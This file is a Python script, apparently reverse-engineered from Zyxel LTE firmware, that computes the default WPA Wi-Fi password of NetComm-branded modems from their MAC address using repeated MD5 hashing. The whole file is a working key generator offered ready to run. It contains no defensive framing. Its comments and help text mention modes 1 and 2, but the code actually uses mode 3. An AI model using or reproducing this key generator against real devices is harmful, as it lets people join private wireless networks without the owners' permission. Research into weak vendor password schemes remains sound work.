# mode 1 and 2 from /usr/sbin/commander found in various Zyxel LTE firmwares
# code indicates SSID starts with "NetComm Wireless " followed by 4 numbers.
# only netcom modems found so far do not show the mac on the sticker.

import hashlib
import argparse

def passgen(input, pwd_length, mode):

	numbers = "0123456789"
	vowels_lc = "aeiou"
	vowels_uc = "AEIOU"
	cons_lc = "bcdfghjklmnpqrstvwxyz"
	cons_uc = "BCDFGHJKLMNPQRSTVWXYZ"
	hexx = "abcdef"

	if mode == 1:
		charset = vowels_lc + cons_lc
	elif mode == 2:
		charset = vowels_lc + vowels_uc + cons_lc + cons_uc
	elif mode == 3:
		charset = cons_uc
	elif mode == 4:
		charset = vowels_lc + vowels_uc + cons_lc + cons_uc + numbers
	elif mode == 5:
		charset = numbers
	elif mode == 6:
		charset = numbers + hexx

	hashh = hashlib.md5()
	hashh.update(input.encode())
	digest = hashh.digest()

	pwd = ''
	for i in range(pwd_length):
		hashh2 = hashlib.md5()
		hashh2.update(digest)
		new_digest = hashh2.digest()
		long_int = 0
		long_int = long_int + new_digest[0]
		long_int = long_int + new_digest[1] * 2 ** 8
		long_int = long_int + new_digest[2] * 2 ** 16
		long_int = long_int + new_digest[3] * 2 ** 24

		char_pos = long_int % len(charset)
		letter = charset[char_pos]
		pwd += letter
		if mode == 3:
			if len(charset) == 5:
				charset = cons_lc
			else:
				charset = vowels_lc
		digest = new_digest
	return pwd

def netcomm(mac):

	mac_bytes = []
	for i in range(0, 12, 2):
		mac_bytes.append(mac[i:i+2].upper())
	
	input_string = mac_bytes[0]
	for i in range(1, 6):
		input_string += "-"
		input_string += mac_bytes[i]
	input_string += "_WPA"
	
	password = passgen(input_string, 10, 3).lower()
	print(password)


parser = argparse.ArgumentParser(description='Mode 1 and 2 from /usr/sbin/commander found in various Zyxel LTE firmwares keygen.')
parser.add_argument('mac', help='Mac address')
args = parser.parse_args()

netcomm(args.mac)